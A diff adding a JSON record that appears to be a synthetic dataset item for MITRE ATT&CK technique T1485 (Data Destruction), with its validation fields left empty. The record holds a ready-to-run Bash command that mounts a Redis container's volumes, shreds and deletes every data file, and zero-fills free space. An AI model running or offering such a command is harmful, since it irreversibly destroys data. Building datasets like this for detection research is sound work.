@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1485",
+  "platform": "Containers",
+  "shell": "Bash",
+  "command": "docker run --rm --volumes-from redis01 ubuntu bash -lc 'if [ -d /data ]; then find /data -type f -print0 | xargs -0 -r shred -n 2 -z -u; dd if=/dev/zero of=/data/.wipe bs=10M || true; sync; rm -f /data/.wipe; fi'",
+  "explanation": "Targets the Redis data directory exposed by redis01, securely overwriting and deleting data files and then zero-filling free space to remove remnants, followed by sync.",
+  "rationale_steps": [
+    "Reuse redis01's data mount via --volumes-from",
+    "Shred all data files with multiple passes and delete",
+    "Fill remaining free space with zeros to wipe slack space",
+    "Sync and remove filler file"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1485-763669c5-13f0cb8c",
+  "source_prompt_hash": "763669c5",
+  "timestamp_utc": "2025-09-30T08:01:03.936632Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
